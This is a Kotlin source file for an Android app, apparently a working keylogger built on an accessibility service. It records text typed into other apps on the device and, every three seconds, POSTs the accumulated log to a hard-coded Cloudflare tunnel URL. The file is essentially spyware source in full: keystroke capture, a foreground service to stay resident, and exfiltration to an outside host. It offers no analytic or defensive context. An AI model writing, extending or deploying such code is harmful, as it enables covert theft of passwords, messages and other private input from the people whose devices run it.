package com.example.myapplication

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Intent
import android.os.Build
import android.view.accessibility.AccessibilityEvent
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class KeyLoggerService : AccessibilityService() {
    private var lastText: String = ""
    private var sendJob: Job? = null

    override fun onServiceConnected() {
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        serviceInfo = info
        startForegroundService()
        startSendingLogs()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val currentText = event.text.joinToString("")
            if (currentText.isNotBlank() && currentText != lastText) {
                lastText = currentText
                MainActivity.keystrokeLogs.append(currentText).append("\n")
                MainActivity.activityInstance?.updateLogDisplay(currentText)
            }
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        sendJob?.cancel()
        super.onDestroy()
    }

    private fun startSendingLogs() {
        sendJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                delay(3000)
                if (MainActivity.keystrokeLogs.isNotEmpty()) {
                    sendLogsToServer(MainActivity.keystrokeLogs.toString())
                }
            }
        }
    }

    private fun sendLogsToServer(logs: String) {
        try {
            val url = java.net.URL("https://storm-supply-miles-heating.trycloudflare.com//upload")
            val connection = url.openConnection() as java.net.HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "text/plain")
            connection.doOutput = true

            val outputBytes = logs.toByteArray(Charsets.UTF_8)
            connection.outputStream.use { it.write(outputBytes) }

            connection.responseCode
            connection.disconnect()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @SuppressLint("ForegroundServiceType", "ObsoleteSdkInt")
    private fun startForegroundService() {
        val channelId = "KeyLoggerServiceChannel"
        val channelName = "Keylogger Background Service"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                channelName,
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                lockscreenVisibility = Notification.VISIBILITY_PRIVATE
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.getActivity(
                this,
                0,
                notificationIntent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
        } else {
            PendingIntent.getActivity(
                this,
                0,
                notificationIntent,
                PendingIntent.FLAG_UPDATE_CURRENT
            )
        }

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Keylogger Running")
            .setContentText("Monitoring input...")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        startForeground(1, notification)
    }
}